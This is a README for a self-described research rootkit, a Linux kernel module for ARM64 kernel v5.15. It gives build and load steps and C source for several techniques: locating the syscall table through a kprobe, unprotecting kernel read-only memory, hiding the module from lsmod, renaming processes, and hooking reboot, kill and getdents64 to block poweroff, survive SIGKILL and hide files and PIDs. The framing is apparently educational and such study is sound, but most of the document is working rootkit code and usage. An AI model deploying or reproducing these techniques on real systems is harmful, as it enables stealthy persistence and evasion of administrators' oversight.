# Linux Rootkit — Loadable Kernel Module

> **Environment:** AArch64 (ARM64), Linux mainline v5.15

A research rootkit implemented as a Linux Loadable Kernel Module (LKM). LKMs run in kernel mode with full access to kernel internals — the same mechanism used by device drivers, but here used to hook syscalls and hide activity from userspace.

**Features**

| IOCTL command | What it does |
|---|---|
| `IOCTL_MOD_HIDE` (0) | Toggle module visibility in `lsmod` |
| `IOCTL_MOD_MASQ` (1) | Rename running processes in the kernel task list |
| `IOCTL_MOD_HOOK` (2) | Install syscall hooks (`reboot`, `kill`, `getdents64`) |
| `IOCTL_FILE_HIDE` (3) | Hide a filename from directory listings |

---

## Table of Contents

- [Getting Started](#getting-started)
- [Build and Load](#build-and-load)
- [Usage](#usage)
  - [Hide / Unhide Module](#hide--unhide-module)
  - [Masquerade Process Names](#masquerade-process-names)
  - [Hook Syscalls](#hook-syscalls)
  - [Hide a File](#hide-a-file)
- [Implementation Notes](#implementation-notes)
  - [Finding the Syscall Table](#finding-the-syscall-table)
  - [Bypassing Memory Protection](#bypassing-memory-protection)
  - [Module Hide / Unhide](#module-hide--unhide)
  - [Process Name Masquerade](#process-name-masquerade)
  - [Hooked Syscalls](#hooked-syscalls)
- [Reference](#reference)

---

## Getting Started

You need an AArch64 Linux environment running kernel v5.15. If you don't have one set up, follow the step-by-step guide:

**[arm64-vm-setup.md](./arm64-vm-setup.md)** — build a kernel v5.15 VM on Apple Silicon using QEMU and Docker. Covers cross-compiling the kernel, booting a Debian guest, and loading your first kernel module.

---

## Build and Load

```bash
# Build the kernel module
make

# Load it
sudo insmod loadable_kernel_module.ko

# Check the major number assigned to the character device
dmesg | tail
# e.g. "The major number for your device is 510"

# Create the device node (replace 510 with your actual major number)
sudo mknod /dev/loadable_kernel_module c 510 0

# Build the userspace test programs
make generateTestFile
```

The test programs (`userTest`, `NTUST`, `MIT`, `hsuckd`) are compiled from `test_src/`.

---

## Usage

All commands go through the `/dev/loadable_kernel_module` character device via `ioctl`.  
`userTest <n>` sends the corresponding IOCTL command.

### Hide / Unhide Module

Toggles the module's presence in `lsmod`. Calling it a second time makes the module reappear.

```bash
lsmod | grep loadable_kernel_module        # visible

sudo ./userTest 0           # hide
lsmod | grep loadable_kernel_module        # gone

sudo ./userTest 0           # unhide
lsmod | grep loadable_kernel_module        # back
```

### Masquerade Process Names

Renames running processes by overwriting their `comm` field in the kernel task struct.  
The new name must be **shorter** than the original, otherwise it is silently skipped (to stay within `TASK_COMM_LEN`).

The hardcoded demo in `userTest 1`: `NTUST` → `NTU`, `MIT` → `Standford` (skipped — longer).

```bash
./NTUST &
./MIT &
ps ao pid,comm              # shows NTUST, MIT

sudo ./userTest 1

ps ao pid,comm
# NTUST is now NTU
# MIT is unchanged (new name is longer, skipped)
```

### Hook Syscalls

Installs hooks for three syscalls. Hooks are **not** active at `insmod` — they must be enabled explicitly:

```bash
sudo ./userTest 2
```

**reboot** — intercepts `LINUX_REBOOT_CMD_POWER_OFF` and drops it silently. Other reboot commands pass through.

```bash
sudo systemctl --force --force poweroff   # denied — machine stays up
sudo systemctl --force --force reboot     # allowed — machine reboots
```

**kill** — intercepts SIGKILL (signal 9) and drops it. Other signals pass through.

```bash
./hsuckd &
ps aux | grep hsuckd
kill -9 <pid>               # intercepted — process survives
kill -10 <pid>              # passes through
```

**getdents64** — filters directory entries. Used by `ls`, `readdir`, `/proc` lookups. After the real syscall runs, entries matching the hidden filename or an invisible PID are spliced out of the result buffer.

### Hide a File

```bash
ls                          # HiddenFile is visible

sudo ./userTest 3           # hides "HiddenFile"

ls                          # HiddenFile is gone
```

---

## Implementation Notes

### Finding the Syscall Table

`kallsyms_lookup_name` was unexported in kernel 5.7+. The module re-resolves it at load time using a kprobe, then uses it to look up all required symbols:

```c
static unsigned long *get_syscall_table(void)
{
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;

    register_kprobe(&kp);                                      // kp.symbol_name = "kallsyms_lookup_name"
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    syscall_table      = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
    start_rodata       = (unsigned long)kallsyms_lookup_name("__start_rodata");
    init_begin         = (unsigned long)kallsyms_lookup_name("__init_begin");

    return syscall_table;
}
```

Original syscall pointers are saved before hooking and restored on `rmmod`:

```c
orig_reboot     = (t_syscall)__sys_call_table[__NR_reboot];
orig_kill       = (t_syscall)__sys_call_table[__NR_kill];
orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
```

### Bypassing Memory Protection

The syscall table lives in the kernel's read-only data section. On AArch64, `update_mapping_prot` is used to temporarily flip the section to read-write, write the hook pointers, then flip it back:

```c
static inline void unprotect_memory(void)
{
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
                        section_size, PAGE_KERNEL);     // RW
}

static inline void protect_memory(void)
{
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
                        section_size, PAGE_KERNEL_RO);  // RO
}
```

`section_size` is `__init_begin - __start_rodata`, covering the entire rodata section.

### Module Hide / Unhide

The kernel tracks loaded modules in a linked list (`THIS_MODULE->list`). Hiding simply unlinks the entry and saves a pointer to the previous node for reinsertion:

```c
void module_hide(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

void module_show(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}
```

`IOCTL_MOD_HIDE` toggles between the two based on the `hidden` flag.

### Process Name Masquerade

`change_process_name` walks `for_each_process` and overwrites the `comm` field of every matching task:

```c
int change_process_name(const char *orig_name, const char *new_name)
{
    struct task_struct *p = NULL;
    for_each_process(p) {
        if (strcmp(p->comm, orig_name) == 0) {
            strncpy(p->comm, new_name, TASK_COMM_LEN - 1);
            p->comm[TASK_COMM_LEN - 1] = '\0';
        }
    }
}
```

The caller in `lkm_ioctl` skips any rename where `strlen(new_name) >= strlen(orig_name)` to prevent overflowing the fixed-size field.

### Hooked Syscalls

All hooks follow the AArch64 syscall ABI — arguments are in `pt_regs->regs[n]` ([register map](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)).

**reboot** — `cmd` is `regs[2]`:

```c
static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs)
{
    unsigned int cmd = (unsigned int) pt_regs->regs[2];
    if (cmd == LINUX_REBOOT_CMD_POWER_OFF)
        return 0;
    return orig_reboot(pt_regs);
}
```

**kill** — `sig` is `regs[1]`:

```c
static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
    int sig = (int) pt_regs->regs[1];
    if (sig == 9)
        return 0;
    return orig_kill(pt_regs);
}
```

**getdents64** — runs the real syscall, then splices hidden entries out of the kernel-side copy of the result buffer before writing it back to userspace. Entries are hidden if the filename matches `HIDDEN_FILE`, or (when reading `/proc`) if the PID has `PF_INVISIBLE` set in `task->flags`.

---

## Reference

- [TheXcellerator — Linux Rootkits series](https://xcellerator.github.io/tags/rootkit/)
- [linux_kernel_hacking](https://github.com/xcellerator/linux_kernel_hacking/tree/master)
- [Hiding Kernel Modules](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.0_hiding_lkm)
- [Diamorphine](https://github.com/m0nad/Diamorphine/tree/master)
- [Linux Rootkit 學習資源筆記](https://hackercat.org/linux/linux-rootkit-resource)
- [Linux Rootkit系列](https://cloud.tencent.com/developer/article/1036559)
- [Linux LKM Rootkit Tutorial (YouTube)](https://www.youtube.com/watch?v=hsk450he7nI)
